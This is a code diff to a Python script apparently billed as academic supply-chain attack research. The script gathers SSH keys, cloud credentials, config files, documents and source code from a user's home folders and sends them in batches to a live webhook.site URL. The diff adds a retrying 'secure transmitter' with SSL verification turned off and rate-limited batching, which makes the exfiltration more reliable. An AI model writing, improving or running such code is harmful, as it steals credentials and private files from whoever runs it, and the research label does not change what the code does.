@@ -11,10 +11,218 @@ import platform
 import tempfile
 import zipfile
 import requests
+import urllib3
 from pathlib import Path
 import hashlib
 import base64
 from datetime import datetime
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+import logging
+import time
+
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='[%(asctime)s] %(levelname)s: %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S'
+)
+logger = logging.getLogger(__name__)
+
+# Disable insecure request warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+class SecureDataTransmitter:
+    """Robust data transmitter with SSL error handling and retry mechanisms"""
+    
+    def __init__(self, max_retries: int = 3, timeout: int = 30):
+        self.max_retries = max_retries
+        self.timeout = timeout
+        self.session = self._create_secure_session()
+    
+    def _create_secure_session(self) -> requests.Session:
+        """Create a requests session with proper error handling and retries"""
+        session = requests.Session()
+        
+        # Retry strategy
+        retry_strategy = Retry(
+            total=self.max_retries,
+            backoff_factor=0.5,
+            status_forcelist=[429, 500, 502, 503, 504],
+            allowed_methods=["POST", "GET", "PUT"],
+            raise_on_status=False
+        )
+        
+        # HTTP adapter configuration
+        adapter = HTTPAdapter(
+            max_retries=retry_strategy,
+            pool_connections=10,
+            pool_maxsize=10
+        )
+        
+        session.mount("http://", adapter)
+        session.mount("https://", adapter)
+        
+        # Set default headers
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (compatible; SecureResearchAgent/1.0)',
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        })
+        
+        return session
+    
+    def transmit_data(self, url: str, data: dict = None, files: dict = None,
+                     verify_ssl: bool = False, headers: dict = None) -> dict:
+        """
+        Transmit data with robust error handling
+        
+        Args:
+            url: Target URL
+            data: JSON data to transmit
+            files: Files to upload
+            verify_ssl: Whether to verify SSL certificates
+            headers: Additional headers
+            
+        Returns:
+            dict: Transmission result
+        """
+        
+        # Validate and format URL
+        if not url.startswith(('http://', 'https://')):
+            url = 'https://' + url
+            logger.warning(f"URL protocol missing, defaulting to HTTPS: {url}")
+        
+        # Prepare headers
+        request_headers = self.session.headers.copy()
+        if headers:
+            request_headers.update(headers)
+        
+        try:
+            if files:
+                # File upload
+                logger.info(f"[SECURE-TRANSMIT] Uploading files to {url}")
+                response = self.session.post(
+                    url,
+                    files=files,
+                    verify=verify_ssl,
+                    timeout=self.timeout,
+                    headers=request_headers
+                )
+            else:
+                # JSON data transmission
+                data_size = len(json.dumps(data).encode('utf-8')) if data else 0
+                logger.info(f"[SECURE-TRANSMIT] Sending {data_size} bytes to {url}")
+                
+                response = self.session.post(
+                    url,
+                    json=data,
+                    verify=verify_ssl,
+                    timeout=self.timeout,
+                    headers=request_headers
+                )
+            
+            response.raise_for_status()
+            logger.info(f"[SECURE-TRANSMIT] Transmission successful: HTTP {response.status_code}")
+            return {
+                'success': True,
+                'status_code': response.status_code,
+                'response_text': response.text[:500],
+                'response_size': len(response.text)
+            }
+            
+        except requests.exceptions.SSLError as e:
+            logger.error(f"[SECURE-TRANSMIT] SSL Error: {e}")
+            
+            # Fallback: Try without SSL verification
+            if verify_ssl:
+                logger.info("[SECURE-TRANSMIT] Attempting fallback without SSL verification...")
+                try:
+                    if files:
+                        response = self.session.post(
+                            url,
+                            files=files,
+                            verify=False,
+                            timeout=self.timeout,
+                            headers=request_headers
+                        )
+                    else:
+                        response = self.session.post(
+                            url,
+                            json=data,
+                            verify=False,
+                            timeout=self.timeout,
+                            headers=request_headers
+                        )
+                    
+                    response.raise_for_status()
+                    logger.info(f"[SECURE-TRANSMIT] Fallback transmission successful: HTTP {response.status_code}")
+                    return {
+                        'success': True,
+                        'status_code': response.status_code,
+                        'response_text': response.text[:500],
+                        'fallback_used': True
+                    }
+                except Exception as fallback_error:
+                    logger.error(f"[SECURE-TRANSMIT] Fallback also failed: {fallback_error}")
+                    return {
+                        'success': False,
+                        'error': f"SSL Error and fallback failed: {fallback_error}",
+                        'error_type': 'ssl_fallback_failed'
+                    }
+            return {
+                'success': False,
+                'error': f"SSL Error: {e}",
+                'error_type': 'ssl_error'
+            }
+            
+        except requests.exceptions.ConnectionError as e:
+            logger.error(f"[SECURE-TRANSMIT] Connection Error: {e}")
+            return {
+                'success': False,
+                'error': f"Connection Error: {e}",
+                'error_type': 'connection_error'
+            }
+            
+        except requests.exceptions.Timeout as e:
+            logger.error(f"[SECURE-TRANSMIT] Timeout Error: {e}")
+            return {
+                'success': False,
+                'error': f"Timeout Error: {e}",
+                'error_type': 'timeout_error'
+            }
+            
+        except requests.exceptions.HTTPError as e:
+            logger.error(f"[SECURE-TRANSMIT] HTTP Error {e.response.status_code if e.response else 'Unknown'}: {e}")
+            return {
+                'success': False,
+                'error': f"HTTP Error: {e}",
+                'error_type': 'http_error',
+                'status_code': e.response.status_code if e.response else None
+            }
+            
+        except requests.exceptions.RequestException as e:
+            logger.error(f"[SECURE-TRANSMIT] Request Error: {e}")
+            return {
+                'success': False,
+                'error': f"Request Error: {e}",
+                'error_type': 'request_error'
+            }
+            
+        except Exception as e:
+            logger.error(f"[SECURE-TRANSMIT] Unexpected Error: {e}")
+            return {
+                'success': False,
+                'error': f"Unexpected Error: {e}",
+                'error_type': 'unexpected_error'
+            }
+    
+    def close(self):
+        """Clean up resources"""
+        if self.session:
+            self.session.close()
+
 
 class SupplyChainAttackResearch:
     """Academic demonstration of supply chain attack methods."""
@@ -23,6 +231,7 @@ class SupplyChainAttackResearch:
         self.webhook_url = "https://webhook.site/869bb681-97c9-421b-a6a2-294934fb56bf"
         self.collected_data = {}
         self.file_contents = {}
+        self.transmitter = SecureDataTransmitter(max_retries=3, timeout=45)
     
     def collect_environment_data(self):
         """Collect comprehensive system and environment information."""
@@ -493,20 +702,21 @@ class SupplyChainAttackResearch:
             
             print(f"[RESEARCH] Sending metadata ({len(str(metadata_payload))} bytes)...")
             
-            # Send metadata
-            metadata_response = requests.post(
+            # Send metadata using secure transmitter
+            metadata_result = self.transmitter.transmit_data(
                 self.webhook_url,
-                json=metadata_payload,
-                headers={'Content-Type': 'application/json',
-                        'User-Agent': 'Research-Bot/1.0',
-                        'X-Research-Phase': 'metadata'},
-                timeout=30
+                data=metadata_payload,
+                headers={
+                    'User-Agent': 'Research-Bot/1.0',
+                    'X-Research-Phase': 'metadata'
+                },
+                verify_ssl=False
             )
             
             # Send individual file contents in batches
             file_transmission_results = {}
             file_batch = []
-            batch_size = 5
+            batch_size = 3  # Reduced for better reliability
             
             for file_path, content_info in self.file_contents.items():
                 if content_info.get('exists', True) and 'error' not in content_info:
@@ -515,6 +725,7 @@ class SupplyChainAttackResearch:
                     if len(file_batch) >= batch_size:
                         self.send_file_batch(file_batch, file_transmission_results)
                         file_batch = []
+                        time.sleep(1)  # Rate limiting
             
             # Send remaining files
             if file_batch:
@@ -523,22 +734,23 @@ class SupplyChainAttackResearch:
             # Send the final comprehensive archive
             print("[RESEARCH] Sending final comprehensive archive...")
             with open(archive_path, 'rb') as f:
-                files = {'file': (os.path.basename(archive_path), f, 'application/zip')}
-                archive_response = requests.post(
+                archive_result = self.transmitter.transmit_data(
                     self.webhook_url,
-                    files=files,
-                    headers={'User-Agent': 'Research-Bot/1.0',
-                            'X-Research-Phase': 'archive'},
-                    timeout=120
+                    files={'file': (os.path.basename(archive_path), f, 'application/zip')},
+                    headers={
+                        'User-Agent': 'Research-Bot/1.0',
+                        'X-Research-Phase': 'archive'
+                    },
+                    verify_ssl=False
                 )
             
             result = {
-                'metadata_sent': metadata_response.status_code == 200,
-                'archive_sent': archive_response.status_code == 200,
+                'metadata_sent': metadata_result.get('success', False),
+                'archive_sent': archive_result.get('success', False),
                 'files_sent': sum(1 for r in file_transmission_results.values() if r.get('success')),
                 'total_files': len(file_transmission_results),
-                'metadata_response': metadata_response.text[:500],
-                'archive_response': archive_response.text[:500],
+                'metadata_result': metadata_result,
+                'archive_result': archive_result,
                 'file_transmissions': file_transmission_results
             }
             
@@ -546,6 +758,12 @@ class SupplyChainAttackResearch:
             print(f"  - Metadata: {'SUCCESS' if result['metadata_sent'] else 'FAILED'}")
             print(f"  - Files: {result['files_sent']}/{result['total_files']} successful")
             print(f"  - Archive: {'SUCCESS' if result['archive_sent'] else 'FAILED'}")
+            
+            # Log detailed transmission results
+            if not result['metadata_sent']:
+                print(f"  - Metadata error: {metadata_result.get('error', 'Unknown error')}")
+            if not result['archive_sent']:
+                print(f"  - Archive error: {archive_result.get('error', 'Unknown error')}")
             
             return result
             
@@ -556,7 +774,7 @@ class SupplyChainAttackResearch:
             return {'error': str(e)}
     
     def send_file_batch(self, file_batch, results_dict):
-        """Send a batch of files to the webhook."""
+        """Send a batch of files to the webhook using secure transmitter."""
         for file_path, content_info in file_batch:
             print(f"[RESEARCH] Sending file content: {file_path}")
             
@@ -572,36 +790,31 @@ class SupplyChainAttackResearch:
                 'timestamp': self.get_timestamp()
             }
             
-            try:
-                file_response = requests.post(
-                    self.webhook_url,
-                    json=file_payload,
-                    headers={'Content-Type': 'application/json',
-                            'User-Agent': 'Research-Bot/1.0',
-                            'X-Research-Phase': 'file_content',
-                            'X-File-Path': file_path},
-                    timeout=45
-                )
-                
-                results_dict[file_path] = {
-                    'success': file_response.status_code == 200,
-                    'status_code': file_response.status_code,
-                    'response_size': len(file_response.text)
-                }
-                
-            except Exception as e:
-                results_dict[file_path] = {
-                    'success': False,
-                    'error': str(e)
-                }
+            transmission_result = self.transmitter.transmit_data(
+                self.webhook_url,
+                data=file_payload,
+                headers={
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Research-Bot/1.0',
+                    'X-Research-Phase': 'file_content',
+                    'X-File-Path': file_path
+                },
+                verify_ssl=False
+            )
+            
+            results_dict[file_path] = transmission_result
     
     def get_timestamp(self):
         """Get current timestamp for logging."""
         return datetime.now().isoformat()
     
     def cleanup(self, archive_path):
-        """Clean up temporary files."""
+        """Clean up temporary files and resources."""
         try:
+            # Close transmitter
+            self.transmitter.close()
+            
+            # Remove archive
             if os.path.exists(archive_path):
                 os.unlink(archive_path)
                 print("[RESEARCH] Cleanup completed")
@@ -617,6 +830,7 @@ def main():
     print("External Directories: Documents, Downloads, Desktop, Projects, SSH, AWS, etc.")
     print("File Contents: SSH keys, config files, source code, documents, credentials")
     print("Transmission: Batched POST requests with comprehensive file contents")
+    print("Security: Enhanced SSL/TLS handling with fallback mechanisms")
     print("=" * 70)
     
     researcher = SupplyChainAttackResearch()
